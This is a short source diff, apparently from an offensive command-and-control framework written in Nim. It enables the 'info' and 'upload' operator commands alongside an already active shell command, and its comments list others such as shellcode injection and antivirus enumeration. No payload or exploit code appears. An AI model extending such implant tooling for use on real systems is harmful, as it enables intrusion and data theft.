@@ -2,7 +2,7 @@ import ../types
 
 import interactCommands/[
   # downloadCmd,
-  # infoCmd,
+  infoCmd,
   # injectShellcodeCmd,
   # msgboxCmd,
   # processesCmd,
@@ -10,7 +10,7 @@ import interactCommands/[
   shellCmd,
   dirCmd,
   # tokeninfoCmd,
-  # uploadCmd,
+  uploadCmd,
   # sleepCmd,
   # enumtasksCmd,
   # antivirusesCmd
@@ -34,7 +34,7 @@ import mainCommands/[
 
 let commands*: seq[Command] = @[
   # downloadCmd.cmd,
-  # infoCmd.cmd,
+  infoCmd.cmd,
   # injectShellcodeCmd.cmd,
   # msgboxCmd.cmd,
   # processesCmd.cmd,
@@ -42,7 +42,7 @@ let commands*: seq[Command] = @[
   shellCmd.cmd,
   dirCmd.cmd,
   # tokeninfoCmd.cmd,
-  # uploadCmd.cmd,
+  uploadCmd.cmd,
   # sleepCmd.cmd,
   # enumtasksCmd.cmd,
   # antivirusesCmd.cmd,
